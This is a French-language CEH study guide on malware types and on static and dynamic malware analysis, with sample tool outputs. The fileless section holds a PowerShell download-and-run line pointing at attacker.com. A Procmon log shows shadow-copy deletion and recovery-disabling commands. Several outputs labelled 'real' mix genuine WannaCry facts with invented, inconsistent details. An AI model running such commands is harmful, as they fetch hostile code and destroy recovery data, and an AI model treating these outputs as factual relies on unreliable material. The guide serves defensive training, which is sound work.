# 🛡️ CEH v12 — MODULE 7 : MALWARES
### Guide pédagogique avancé — Analyse complète | ML | exploit4040

---

## 📌 INTRODUCTION — COMPRENDRE LES MALWARES POUR MIEUX DÉFENDRE

Le Module 7 est fondamental pour deux raisons opposées mais complémentaires :

**Côté offensif :** Un pentester doit comprendre comment les malwares fonctionnent pour simuler des attaques réalistes lors d'exercices Red Team.

**Côté défensif :** Un analyste SOC, un incident responder, ou un malware analyst doit **disséquer** un malware pour comprendre ce qu'il fait, comment il se propage, et comment l'éradiquer.

> **Le CEH te demande de maîtriser les DEUX perspectives.**

```
PHILOSOPHIE DU MODULE 7 :

"Pour construire un bouclier parfait,
 tu dois comprendre parfaitement l'épée."

→ Analyser un malware = comprendre l'attaquant
→ Comprendre l'attaquant = construire de meilleures défenses
```

---

## 📌 PARTIE 1 : TAXONOMIE COMPLÈTE DES MALWARES

### 🔵 Classification par comportement

---

#### 🦠 VIRUS

Un virus est un **code malveillant qui s'attache à un fichier hôte légitime** et se propage quand ce fichier est exécuté. Il ne peut pas se propager seul — il a besoin d'une action humaine.

```
CYCLE DE VIE D'UN VIRUS :

Fichier hôte légitime
        │
        ▼
Virus injecte son code
        │
        ▼
Fichier infecté = Vecteur
        │
        ▼
Utilisateur exécute le fichier
        │
        ▼
Virus s'active → Cherche nouveaux hôtes → Se réplique
        │
        ▼
Payload s'exécute (destruction, vol, backdoor...)
```

**Types de virus :**

```
┌─────────────────────────────────────────────────────────────────────┐
│  TYPE              │  CIBLE           │  EXEMPLE                    │
├─────────────────────────────────────────────────────────────────────┤
│  File Infector     │  Exécutables     │  Infect .exe, .com          │
│  Boot Sector       │  MBR du disque   │  Stoned, Michelangelo       │
│  Macro Virus       │  Documents Office│  Melissa, Concept           │
│  Multipartite      │  Boot + fichiers │  Combines les deux          │
│  Polymorphic       │  Variable        │  Mute son code à chaque     │
│                    │                  │  réplication (évasion AV)   │
│  Metamorphic       │  Variable        │  Réécrit entièrement son    │
│                    │                  │  code (plus avancé que poly)│
│  Stealth           │  Variable        │  Se cache de l'AV           │
│  Cavity (Sparse)   │  Exécutables     │  S'insère dans les zones    │
│                    │                  │  vides du fichier           │
└─────────────────────────────────────────────────────────────────────┘
```

---

#### 🪱 WORM (Ver)

Contrairement au virus, un worm **se propage de façon autonome** sur le réseau sans avoir besoin d'un fichier hôte ou d'une action humaine.

```
PROPAGATION D'UN WORM :

Machine A infectée
        │
        ▼
Scan du réseau → Trouve machines vulnérables
        │
        ├── Machine B → Exploite vulnérabilité → Copie du worm
        ├── Machine C → Exploite vulnérabilité → Copie du worm
        └── Machine D → Exploite vulnérabilité → Copie du worm

Chaque machine infectée répète le processus
→ Propagation EXPONENTIELLE
```

**Worms célèbres et leur mécanisme :**

```
Morris Worm (1988)
├── Premier worm historique
├── Exploitait sendmail, fingerd, rsh
└── Infecta ~6 000 machines (10% de l'internet de l'époque)

CodeRed (2001)
├── Exploitait IIS buffer overflow
├── Défacement "HELLO! Welcome to http://www.worm.com!"
└── ~359 000 machines infectées en 14 heures

Slammer/Sapphire (2003)
├── UDP, port 1434 (SQL Server)
├── Packet de 376 octets = worm complet
└── Doublement toutes les 8.5 secondes → 75 000 infections en 10 min

Conficker (2008-2009)
├── Exploitait MS08-067 (Windows RPC)
├── Patch sorti avant l'épidémie → machines non patchées
└── ~9-15 millions de machines infectées

WannaCry (2017)
├── Exploitait EternalBlue (MS17-010 / CVE-2017-0144)
├── Ransomware + worm = combinaison dévastatrice
└── 300 000+ systèmes dans 150 pays, $4 milliards de dégâts
```

---

#### 🐴 TROJAN (Cheval de Troie)

Un Trojan se **déguise en logiciel légitime** mais cache une fonctionnalité malveillante. Il ne se réplique pas.

```
ANALOGIE PARFAITE :
Le cheval de Troie d'Homère → Cadeau en apparence, armée à l'intérieur
→ "Crack de logiciel", "Keygen", "Mise à jour Flash", "Jeu gratuit"

TYPES DE TROJANS :
├── RAT (Remote Access Trojan)
│   → Contrôle total de la machine à distance
│   → Exemples : DarkComet, NjRAT, AsyncRAT, Cobalt Strike
│
├── Banker Trojan
│   → Vol de credentials bancaires
│   → Injecte dans navigateur, intercepte transactions
│   → Exemples : Zeus, Emotet, TrickBot, Dridex
│
├── Dropper
│   → Télécharge et installe d'autres malwares
│   → Souvent le premier stage d'une infection
│
├── Downloader
│   → Similaire au dropper mais télécharge depuis URL
│
├── Rootkit Trojan
│   → Cache sa présence + d'autres processus malveillants
│
├── Destructive Trojan
│   → Efface ou corrompt des fichiers (Dark Avenger, CIH)
│
└── Proxy Trojan
    → Transforme la machine en proxy pour masquer l'attaquant
```

---

#### 💰 RANSOMWARE

Le ransomware **chiffre les fichiers de la victime** et demande une rançon pour la clé de déchiffrement.

```
CYCLE D'ATTAQUE RANSOMWARE :

VECTEUR D'ENTRÉE
├── Email phishing (pièce jointe malveillante)
├── Exploitation RDP exposé (bruteforce)
├── Exploitation de vulnérabilités (EternalBlue)
└── Supply chain (logiciel légitime compromis)
        │
        ▼
RECONNAISSANCE INTERNE
├── Cartographie du réseau
├── Identification des sauvegardes
└── Élévation de privilèges
        │
        ▼
DÉSACTIVATION DES DÉFENSES
├── Désactiver Windows Defender
├── Supprimer les sauvegardes (VSS)
├── Désactiver les journaux
└── Terminer les processus AV/EDR
        │
        ▼
CHIFFREMENT
├── Chiffrement asymétrique RSA pour protéger la clé
├── Chiffrement symétrique AES pour les fichiers
├── Extensions modifiées (.encrypted, .locked, .WNCRY)
└── Note de rançon déposée (README.txt, !DECRYPT.txt)
        │
        ▼
DEMANDE DE RANÇON
├── Paiement en Bitcoin/Monero
├── Timer (pression psychologique)
└── Double extorsion : chiffrement + vol + menace de publication

TYPES :
├── Crypto Ransomware → Chiffre les fichiers
├── Locker Ransomware → Bloque l'accès à l'OS
└── Scareware → Faux ransomware, intimidation
```

**Ransomwares célèbres :**

```
WannaCry (2017)
├── Exploitait EternalBlue pour se propager automatiquement
├── Rançon : $300-600 en Bitcoin
├── Kill switch découvert par MalwareTech (Marcus Hutchins)
└── Attribution : Lazarus Group (Corée du Nord)

NotPetya (2017)
├── Déguisé en ransomware mais wiper réel (pas de déchiffrement possible)
├── Propagation via EternalBlue + Mimikatz
├── $10 milliards de dégâts (Maersk, Merck, FedEx...)
└── Attribution : Sandworm (GRU russe)

REvil/Sodinokibi (2019-2021)
├── Ransomware-as-a-Service (RaaS)
├── Attaque Kaseya VSA (4 juillet 2021) → 1 500 entreprises
└── Rançon : $70 millions demandés

LockBit 3.0 (2022-présent)
├── RaaS le plus actif mondialement
├── Bug Bounty program (ironique)
└── Double/Triple extorsion
```

---

#### 🔐 ROOTKIT

Un rootkit est conçu pour **cacher sa présence et celle d'autres malwares** en modifiant le système d'exploitation.

```
TYPES DE ROOTKITS PAR NIVEAU :

NIVEAU UTILISATEUR (User-mode rootkit)
├── Modifie les DLLs système (DLL injection/hooking)
├── Hooks les fonctions API Windows
├── Plus facile à détecter (tourne dans user space)
└── Exemples : Azazel, Necurs

NIVEAU KERNEL (Kernel-mode rootkit)
├── Tourne en Ring 0 (même niveau que l'OS)
├── Modifie le kernel → modification des tables SSDT
├── Très difficile à détecter (invisible pour l'OS)
└── Exemples : Necurs, TDL4, ZeroAccess

BOOTKIT
├── S'installe dans le MBR/VBR (avant l'OS)
├── Persiste même après réinstallation de l'OS
├── Contrôle tout le processus de démarrage
└── Exemples : Rovnix, Olmasco, Carberp

HYPERVISOR ROOTKIT
├── S'installe sous l'OS (hyperviseur malveillant)
├── L'OS croit tourner directement sur le hardware
├── Extrêmement sophistiqué
└── Exemple : Blue Pill (preuve de concept)

FIRMWARE ROOTKIT
├── S'installe dans le firmware (BIOS/UEFI)
├── Survit au formatage et à la réinstallation
├── Nécessite le reflash du firmware pour éradiquer
└── Exemples : LoJax (premier UEFI rootkit in-the-wild, APT28)

DÉTECTION DES ROOTKITS :
├── Comparer les processus en mémoire vs sur disque
├── Integrity checking (AIDE, Tripwire)
├── Memory forensics (Volatility)
├── Rootkit scanners (Malwarebytes, GMER, RootkitRevealer)
└── Démarrage depuis médias externes (live USB)
```

---

#### 🕵️ SPYWARE / ADWARE / KEYLOGGER

```
SPYWARE :
├── Collecte des informations à l'insu de l'utilisateur
├── Historique navigation, fichiers, screenshots
└── Exemple : FinFisher, Pegasus (NSO Group)

ADWARE :
├── Affiche des publicités non désirées
├── Souvent bundlé avec logiciels gratuits
└── Frontière floue avec PUA (Potentially Unwanted Application)

KEYLOGGER :
├── Enregistre chaque frappe clavier
├── Types :
│   ├── Software keylogger → Hook du clavier Windows (SetWindowsHookEx)
│   ├── Hardware keylogger → Dispositif physique entre clavier et PC
│   ├── Acoustic keylogger → Analyse son des touches
│   └── Electromagnetic keylogger → Capture émissions EM
└── Exemples : Ardamax, BlackBox, Perfect Keylogger
```

---

#### 🤖 BOTNET

Un botnet est un **réseau de machines infectées (bots/zombies)** contrôlées centralement par un attaquant (botmaster).

```
ARCHITECTURE D'UN BOTNET :

BOTMASTER (Attaquant)
        │
        ▼
INFRASTRUCTURE C2 (Command & Control)
        │
        ├── Model Client-Serveur classique
        │   Botmaster → C2 Server → Bots
        │   (facile à démanteler si C2 tombé)
        │
        └── Model P2P (plus résilient)
            Bots communiquent entre eux
            Pas de serveur central → plus difficile à démanteler

BOTS (machines infectées)
├── Attente de commandes
├── Exécution : DDoS, spam, vol de données, minage crypto
└── Propagation vers nouvelles victimes

UTILISATIONS :
├── DDoS (Distributed Denial of Service)
├── Spam massif
├── Credential stuffing
├── Cryptomining
└── Proxy / Anonymisation

EXEMPLES CÉLÈBRES :
├── Mirai (2016) → Infectait IoT, DNS DDoS de Dyn → Twitter/Netflix HS
├── Zeus        → Vol credentials bancaires, 3.6 millions de PCs
├── Emotet      → Botnet le plus sophistiqué, démantélé Jan 2021
└── TrickBot    → Successeur d'Emotet, banking + ransomware delivery
```

---

#### 💣 LOGIC BOMB

Code malveillant dormant qui **s'active quand une condition spécifique est remplie**.

```
EXEMPLES DE DÉCLENCHEURS :
├── Date/heure spécifique (vendredi 13, date de licenciement)
├── Nombre de démarrages
├── Absence d'un fichier (mort-man switch)
├── Action d'un utilisateur
└── Absence de connexion (employé licencié)

EXEMPLE HISTORIQUE :
Roger Duronio (2002, UBS PaineWebber)
├── Administrateur système mécontent
├── Planta une logic bomb sur 2 000 serveurs Unix
├── Déclenchée le 4 mars 2002
├── Supprima des fichiers critiques → $3 millions de dégâts
└── Condamné à 8 ans de prison
```

---

#### 👻 FILELESS MALWARE

Le malware fileless **ne s'écrit jamais sur le disque**. Il tourne entièrement en mémoire.

```
POURQUOI C'EST DANGEREUX :
├── Les antivirus traditionnels analysent les fichiers → inefficaces
├── Disparaît au redémarrage (si pas de persistance)
├── Difficile à forensiquer post-incident
└── Très utilisé par les APTs

TECHNIQUES :
├── PowerShell in-memory execution
│   IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
│
├── WMI (Windows Management Instrumentation)
│   Persistance via WMI subscriptions
│
├── Process Injection
│   Injection de code dans un processus légitime (explorer.exe, svchost.exe)
│
├── Living off the Land (LotL)
│   Utilise des outils Windows natifs : PowerShell, WMI, certutil, mshta
│
└── Reflective DLL Injection
    Charge une DLL depuis la mémoire sans passer par le disque

EXEMPLES :
├── Poweliks  → Premier fileless malware grand public (2014)
├── Kovter    → Malware fileless via registre Windows
└── Astaroth  → LotL avancé, utilise wmic.exe, certutil.exe
```

---

## 📌 PARTIE 2 : ANALYSE STATIQUE — SANS EXÉCUTER LE MALWARE

L'analyse statique consiste à **examiner le malware sans l'exécuter**. C'est la première étape — plus rapide et moins dangereuse.

```
OBJECTIFS ANALYSE STATIQUE :
├── Identifier le type de malware
├── Extraire des indicateurs de compromission (IOC)
├── Comprendre les fonctionnalités générales
├── Identifier les techniques anti-analyse
└── Préparer l'analyse dynamique
```

---

### 🛠️ ÉTAPE 1 : HACHAGE — Empreinte numérique

La première chose à faire avec tout malware suspect : **calculer son hash**.

```bash
# Linux
md5sum malware.exe
sha1sum malware.exe
sha256sum malware.exe

# Windows PowerShell
Get-FileHash malware.exe -Algorithm MD5
Get-FileHash malware.exe -Algorithm SHA256
```

**Sortie réelle :**
```bash
$ sha256sum wannacry_sample.exe
ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa  wannacry_sample.exe

$ md5sum wannacry_sample.exe
db349b97c37d22f5ea1d1841e3c89eb4  wannacry_sample.exe
```

**Vérification sur VirusTotal :**
```
VirusTotal Report : ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa

Detection ratio: 68/72 antivirus engines

Engine          Detection
-----------     ---------
Kaspersky       Trojan-Ransom.Win32.Wanna.d
Symantec        Ransom.WannaCry
CrowdStrike     win/malicious_confidence_100%
Sophos          Troj/Ransom-EMU
TrendMicro      Ransom_WCRY.C
Bitdefender     Trojan.GenericKD.5817048
ESET            Win32/Filecoder.WannaCryptor.D
AVG             FileRepMalware [Ransom]

First seen: 2017-05-12
Last seen:  2024-11-15
File size:  3.36 MB (3,523,944 bytes)
File type:  PE32 executable (GUI) Intel 80386
```

---

### 🛠️ ÉTAPE 2 : STRINGS — Extraire les chaînes de caractères

**strings** extrait toutes les chaînes de caractères lisibles d'un binaire. C'est souvent révélateur.

```bash
strings malware.exe
strings -n 8 malware.exe        # Minimum 8 caractères
strings -e l malware.exe        # Unicode (16-bit little-endian)
```

**Sortie réelle (malware de type RAT) :**
```
$ strings rat_sample.exe | head -100

!This program cannot be run in DOS mode.
.text
.rdata
.data
.rsrc
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36
http://192.168.100.50:4444/gate.php
http://backup-c2.darkweb.onion/checkin
/update?id=%s&hostname=%s&os=%s&av=%s
cmd.exe /c ipconfig /all
cmd.exe /c net user
cmd.exe /c systeminfo
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
WindowsDefenderUpdate
C:\Users\%USERNAME%\AppData\Roaming\svchost.exe
HKEY_CURRENT_USER
SeDebugPrivilege
kernel32.dll
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
OpenProcess
IsDebuggerPresent
CheckRemoteDebuggerPresent
GetTickCount
QueryPerformanceCounter
NtQueryInformationProcess
CreateMutexA
Global\{8F6F0AC4-B9A1-45fd-A8CF-72F04E6BDE8F}
keylog_%Y%m%d.txt
screenshots\%Y%m%d_%H%M%S.jpg
C:\Windows\System32\lsass.exe
mimikatz
sekurlsa::logonpasswords
```

**Analyse des strings :**
```
IOCs (Indicators of Compromise) extraits :

RÉSEAU :
├── http://192.168.100.50:4444/gate.php  → Serveur C2
└── backup-c2.darkweb.onion              → C2 de secours via Tor

PERSISTANCE :
└── SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate
    → Clé registre pour persistance au démarrage

FONCTIONNALITÉS :
├── Commandes reconnaissance : ipconfig, net user, systeminfo
├── Keylogging : keylog_%Y%m%d.txt
├── Screenshots : screenshots\%Y%m%d_%H%M%S.jpg
├── Process injection : VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
├── Anti-debug : IsDebuggerPresent, CheckRemoteDebuggerPresent
└── Credential dumping : lsass.exe, mimikatz
```

---

### 🛠️ ÉTAPE 3 : PE STUDIO — Analyse du format PE

**PE (Portable Executable)** est le format des exécutables Windows (.exe, .dll, .sys).

```
STRUCTURE D'UN FICHIER PE :
═══════════════════════════════════════════

DOS Header
├── Magic: MZ (0x4D5A) ← Signature obligatoire
└── Pointer to PE Header

PE Header (IMAGE_NT_HEADERS)
├── Signature: PE\0\0 (0x50450000)
├── FILE_HEADER
│   ├── Machine (x86=0x014C, x64=0x8664)
│   ├── NumberOfSections
│   ├── TimeDateStamp (date de compilation !)
│   └── Characteristics
└── OPTIONAL_HEADER
    ├── AddressOfEntryPoint (début d'exécution)
    ├── ImageBase (adresse de chargement)
    ├── SizeOfImage
    ├── Subsystem (GUI=2, CUI=3)
    └── DataDirectories
        ├── Import Table (DLLs et fonctions importées)
        ├── Export Table
        ├── Resource Table
        └── TLS Callbacks (peut exécuter code avant main!)

Sections :
├── .text  → Code exécutable
├── .data  → Données initialisées
├── .rdata → Données en lecture seule (strings, imports)
├── .rsrc  → Ressources (icônes, manifests, payloads cachés!)
├── .reloc → Table de relocation
└── Sections anormales (noms suspects, entropie haute)
```

**Analyse PE avec pestudio :**

```
PEStudio Analysis Report
═══════════════════════════════════════════════════════════════════
File: malware_sample.exe
SHA-256: ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa

─── GENERAL ─────────────────────────────────────────────────────
File Type:          PE32 executable (GUI)
Architecture:       x86 (32-bit)
Compile Time:       2017-03-23 09:22:14 UTC  ← DATE DE COMPILATION !
Linker Version:     9.0 (Visual Studio 2008)
Entry Point:        0x00401000
Image Base:         0x00400000
Subsystem:          Windows GUI

─── INDICATORS ──────────────────────────────────────────────────
[!] File was packed or encrypted (high entropy in .text section)
[!] Imports suspicious API functions
[!] Contains mutex creation
[!] Detects debugger presence
[!] Creates new processes
[!] Modifies registry Run key
[!] Network communication detected

─── IMPORTS (DLLs et fonctions) ──────────────────────────────────
KERNEL32.DLL:
  [!] VirtualAllocEx          ← Injection mémoire
  [!] WriteProcessMemory       ← Injection mémoire
  [!] CreateRemoteThread       ← Injection mémoire
  [!] IsDebuggerPresent        ← Anti-debug
  [!] OpenProcess              ← Manipulation processus
  [!] CreateFileA              ← Création fichiers
  [!] RegSetValueExA           ← Modification registre

WS2_32.DLL:
  [!] connect                  ← Connexions réseau
  [!] send / recv              ← Communication C2
  [!] WSAStartup               ← Initialisation réseau

WININET.DLL:
  [!] InternetOpenA            ← Requêtes HTTP
  [!] InternetConnectA         ← Connexion serveur distant
  [!] HttpSendRequestA         ← Envoi requêtes HTTP

ADVAPI32.DLL:
  [!] RegOpenKeyExA            ← Accès registre
  [!] OpenProcessToken         ← Manipulation tokens
  [!] LookupPrivilegeValueA    ← Elévation de privilèges

─── SECTIONS ─────────────────────────────────────────────────────
Name    VSize    RSize    Entropy    Flags
.text   0x52000  0x52000  7.89/8.0  Execute/Read   [!] HAUTE ENTROPIE
.data   0x2000   0x1800   4.12      Read/Write
.rsrc   0x8000   0x7C00   7.94/8.0  Read           [!] HAUTE ENTROPIE
.reloc  0x1000   0xC00    5.33      Read

[!] Entropie .text = 7.89 → CODE PROBABLEMENT PACKAGÉ/CHIFFRÉ

─── STRINGS BLACKLISTED ──────────────────────────────────────────
cmd.exe          ← Exécution commandes
powershell       ← Scripting
mimikatz         ← Vol credentials
lsass            ← Dump mémoire
/gate.php        ← URL C2
mutex            ← Prévenir double exécution
```

---

### 🛠️ ÉTAPE 4 : DIE (Detect It Easy) — Identifier les packers

```bash
die malware.exe
```

**Sortie :**
```
PE: 32-bit
Compiler: Microsoft Visual C++ 8.0 (2005)
Packer: UPX 3.96

→ Le malware est packagé avec UPX !
→ Il faut le dépacker avant d'analyser le vrai code
```

**Dépacker UPX :**
```bash
upx -d malware_packed.exe -o malware_unpacked.exe
```

**Sortie :**
```
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.0.2       Markus Oberhumer, Laszlo Molnar & John Reiser

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   3523944 <-   987654    28.02%    win32/pe     malware_unpacked.exe

Unpacked 1 file.
```

---

### 🛠️ ÉTAPE 5 : EXIFTOOL — Métadonnées

```bash
exiftool malware.exe
```

**Sortie :**
```
ExifTool Version Number         : 12.60
File Name                       : malware.exe
File Size                       : 3.4 MB
File Type                       : Win32 EXE
Machine Type                    : Intel 386 or later
Time Stamp                      : 2017:03:23 09:22:14+00:00
PE Type                         : PE32
Code Size                       : 335872
Initialize Data Size            : 745984
Uninitialize Data Size          : 0
Entry Point                     : 0x401000
OS Version                      : 5.1
Image Version                   : 0.0
Subsystem Version               : 5.1
Subsystem                       : Windows GUI
File Version Number             : 1.0.0.0
Product Version Number          : 1.0.0.0
File OS                         : Windows NT 32-bit
Object File Type                : Executable application
Language Code                   : English (U.S.)
Character Set                   : Windows, Latin1
Comments                        : This installation was built with Inno Setup.
Company Name                    : Microsoft Corporation        ← FAUX !
File Description                : Windows Update                ← FAUX !
Legal Copyright                 : © Microsoft Corporation      ← FAUX !
Original Filename               : wcry.exe                     ← VRAI NOM !
```

> Les métadonnées révèlent que le malware **se fait passer pour un outil Microsoft** mais son vrai nom est `wcry.exe` !

---

## 📌 PARTIE 3 : ANALYSE DYNAMIQUE — EXÉCUTER EN ENVIRONNEMENT CONTRÔLÉ

L'analyse dynamique consiste à **exécuter le malware dans un environnement isolé** et observer son comportement en temps réel.

```
ENVIRONNEMENT D'ANALYSE DYNAMIQUE :

SANDBOX (machine isolée)
├── Pas de connexion internet réelle (simulée)
├── Snapshots avant/après exécution
├── Monitoring de TOUS les événements système
│   ├── Fichiers créés/modifiés/supprimés
│   ├── Clés registre créées/modifiées
│   ├── Processus créés/injectés
│   ├── Connexions réseau tentées
│   └── Services installés
└── Extraction automatique d'IOCs
```

---

### 🛠️ PROCMON (Process Monitor) — Monitoring système temps réel

**Procmon** de Sysinternals surveille en temps réel toutes les opérations :

```
Process Monitor v3.94 — RAPPORT D'ANALYSE
═══════════════════════════════════════════════════════════════════
Processus analysé : malware.exe (PID: 4892)
Durée d'observation : 120 secondes

─── OPÉRATIONS FICHIERS ─────────────────────────────────────────
Heure       PID   Processus    Opération           Chemin
10:00:01    4892  malware.exe  CreateFile          C:\Windows\Temp\svchost32.exe
10:00:01    4892  malware.exe  WriteFile           C:\Windows\Temp\svchost32.exe
10:00:02    4892  malware.exe  CreateFile          C:\Users\user\AppData\Roaming\Microsoft\svchost.exe
10:00:02    4892  malware.exe  WriteFile           C:\Users\user\AppData\Roaming\Microsoft\svchost.exe
10:00:05    4892  malware.exe  CreateFile          C:\Users\user\Desktop\@WanaDecryptor@.exe
10:00:06    4892  malware.exe  CreateFile          C:\Users\user\Documents\README_DECRYPT.txt
10:00:07    4892  malware.exe  WriteFile           C:\Users\user\Documents\README_DECRYPT.txt
10:00:08    4892  malware.exe  CreateFile          C:\Users\user\Documents\rapport.docx.WNCRY
10:00:08    4892  malware.exe  WriteFile           C:\Users\user\Documents\rapport.docx.WNCRY
10:00:09    4892  malware.exe  DeleteFile          C:\Users\user\Documents\rapport.docx
[... 2547 opérations similaires de chiffrement ...]
10:01:45    4892  malware.exe  CreateFile          C:\Windows\System32\vssadmin.exe
10:01:46    4892  malware.exe  Process Create      vssadmin.exe delete shadows /all /quiet

─── OPÉRATIONS REGISTRE ─────────────────────────────────────────
10:00:03    4892  malware.exe  RegSetValue
    HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
    → C:\Users\user\AppData\Roaming\Microsoft\svchost.exe

10:00:04    4892  malware.exe  RegSetValue
    HKLM\SYSTEM\CurrentControlSet\Services\mssecsvc2.0\Start
    → 0x00000002 (SERVICE_AUTO_START)

─── CONNEXIONS RÉSEAU ────────────────────────────────────────────
10:00:10    4892  malware.exe  TCP Connect
    Source: 192.168.1.20:49152
    Destination: www.ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com:80
    Result: NAME NOT FOUND  ← KILL SWITCH ! (domaine non enregistré)

10:00:11    4892  malware.exe  TCP Connect
    Source: 192.168.1.20:49153
    Destination: 192.168.1.0/24:445 (scan réseau)
    → Propagation via EternalBlue !

─── PROCESSUS CRÉÉS ──────────────────────────────────────────────
10:00:05    4892  malware.exe  Process Create
    cmd.exe /c "vssadmin delete shadows /all /quiet"

10:00:06    4892  malware.exe  Process Create
    cmd.exe /c "wmic shadowcopy delete"

10:00:07    4892  malware.exe  Process Create
    cmd.exe /c "bcdedit /set {default} recoveryenabled No"
    ← DÉSACTIVATION DE LA RÉCUPÉRATION WINDOWS !
```

---

### 🛠️ REGSHOT — Différentiel de registre

**Regshot** prend deux snapshots du registre (avant et après exécution) et montre les différences.

```
RegShot v1.9.0 — RAPPORT DIFFÉRENTIEL
═══════════════════════════════════════════════════════════════════
1st shot: 2024-11-15 18:00:00 (avant exécution malware)
2nd shot: 2024-11-15 18:02:00 (après exécution malware)

─── CLÉS AJOUTÉES ───────────────────────────────────────────────
Keys added: 8
------
HKLM\SYSTEM\CurrentControlSet\Services\mssecsvc2.0
HKLM\SYSTEM\CurrentControlSet\Services\mssecsvc2.0\Parameters
HKCU\Software\WanaCrypt0r
HKCU\Software\WanaCrypt0r\wd

─── VALEURS AJOUTÉES ────────────────────────────────────────────
Values added: 23
------
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
  → C:\Users\user\AppData\Roaming\svchost.exe  [PERSISTANCE !]

HKLM\SYSTEM\CurrentControlSet\Services\mssecsvc2.0\ImagePath
  → C:\Windows\mssecsvc.exe -m security  [SERVICE MALVEILLANT !]

HKLM\SYSTEM\CurrentControlSet\Services\mssecsvc2.0\Start
  → 0x00000002 [AUTO_START]

HKLM\SYSTEM\CurrentControlSet\Services\mssecsvc2.0\ObjectName
  → LocalSystem [TOURNE EN SYSTEM !]

HKCU\Software\WanaCrypt0r\wd
  → C:\ProgramData\sqjhfvxmri\ [RÉPERTOIRE DE TRAVAIL]

─── CLÉS SUPPRIMÉES ─────────────────────────────────────────────
Keys deleted: 0

─── VALEURS MODIFIÉES ───────────────────────────────────────────
Values modified: 2
------
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RecoveryLastGoodSystemTime
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\PendingFileRenameOperations
```

---

### 🛠️ WIRESHARK — Analyse du trafic réseau

```bash
# Capture pendant l'exécution du malware
wireshark -i eth0 -w malware_traffic.pcap
```

**Analyse du fichier PCAP :**

```
Wireshark Analysis — malware_traffic.pcap
═══════════════════════════════════════════════════════════════════

─── STATISTIQUES GÉNÉRALES ──────────────────────────────────────
Total packets: 4,567
Total time: 120 seconds
Average packets/sec: 38.1

─── FLUX HTTP ────────────────────────────────────────────────────
No. Time      Source          Dest            Info
1   0.000012  192.168.1.20    93.184.216.34   GET http://ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com/ HTTP/1.1
                                              → DNS: NXDOMAIN (kill switch non activé)

2   0.123456  192.168.1.20    185.220.101.45  GET /gate.php?id=WORKSTATION01&hostname=USER-PC
                                              &os=Windows7&av=none HTTP/1.1
    Response: HTTP/1.1 200 OK
    Data: {"cmd":"encrypt","key":"MIIBIjANBgkqhkiG9w..."}

─── SCAN SMB (PROPAGATION) ───────────────────────────────────────
No. Time      Source          Dest            Info
100 1.234000  192.168.1.20    192.168.1.1     TCP SYN  port 445
101 1.234100  192.168.1.20    192.168.1.2     TCP SYN  port 445
102 1.234200  192.168.1.20    192.168.1.3     TCP SYN  port 445
[... scan de tout le /24 sur port 445 ...]
156 1.290000  192.168.1.20    192.168.1.15    TCP SYN  port 445
157 1.291000  192.168.1.15    192.168.1.20    TCP SYN-ACK port 445
                                              → MACHINE VULNÉRABLE TROUVÉE !

─── EXPLOITATION ETERNALBLUE ─────────────────────────────────────
No. Time      Source          Dest            Info
200 1.500000  192.168.1.20    192.168.1.15    SMBv1 Trans2 Request (exploit payload)
201 1.501000  192.168.1.20    192.168.1.15    SMBv1 Trans2 Request (exploit continuation)
[... 15 paquets d'exploit ...]
216 1.520000  192.168.1.15    192.168.1.20    TCP 445→4444 [SYN] ← CONNEXION INVERSE !
                                              → MACHINE 192.168.1.15 COMPROMISE !

─── DNS QUERIES ──────────────────────────────────────────────────
Domaine                                      Type   Résultat
ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com A     NXDOMAIN (kill switch)
gate.darkweb.onion                            A     Resolution via Tor
update.microsoftsecurity.com                 A     185.220.101.45 (FAUX domaine)

─── INDICATEURS RÉSEAU (IOC) ─────────────────────────────────────
IPs C2 contactées :
├── 185.220.101.45   (gate.php)
├── 192.168.1.20→445 (propagation SMB)
└── .onion backup C2  (via Tor)

Domaines suspects :
├── ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com (kill switch)
└── update.microsoftsecurity.com (typosquatting Microsoft)

User-Agents :
└── Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1) ← VIEUX UA SUSPECT
```

---

### 🛠️ CUCKOO SANDBOX — Analyse automatisée complète

**Cuckoo Sandbox** est la plateforme open source de sandboxing la plus utilisée pour l'analyse automatique de malwares.

```bash
# Soumettre un sample à Cuckoo
cuckoo submit --timeout 120 malware.exe

# Ou via l'API REST
curl -F file=@malware.exe http://localhost:8090/tasks/create/file
```

**Rapport Cuckoo — Extrait complet :**

```json
{
  "info": {
    "id": 42,
    "added": "2024-11-15 18:00:00",
    "started": "2024-11-15 18:00:05",
    "ended": "2024-11-15 18:02:05",
    "duration": 120,
    "score": 10.0,
    "category": "ransomware"
  },

  "target": {
    "file": {
      "name": "malware.exe",
      "path": "/tmp/malware.exe",
      "size": 3523944,
      "md5": "db349b97c37d22f5ea1d1841e3c89eb4",
      "sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
      "type": "PE32 executable (GUI) Intel 80386"
    }
  },

  "signatures": [
    {
      "name": "ransomware_files",
      "severity": 3,
      "description": "Encrypted 2,847 files with .WNCRY extension"
    },
    {
      "name": "deletes_shadow_copies",
      "severity": 3,
      "description": "Deleted Volume Shadow Copies to prevent recovery"
    },
    {
      "name": "network_smb_scan",
      "severity": 3,
      "description": "Scanned 254 hosts on port 445 (SMB propagation)"
    },
    {
      "name": "antiav_detectfile",
      "severity": 2,
      "description": "Checks for installed antivirus products"
    },
    {
      "name": "persistence_run_key",
      "severity": 2,
      "description": "Created autorun registry key"
    },
    {
      "name": "injection_createremotethread",
      "severity": 3,
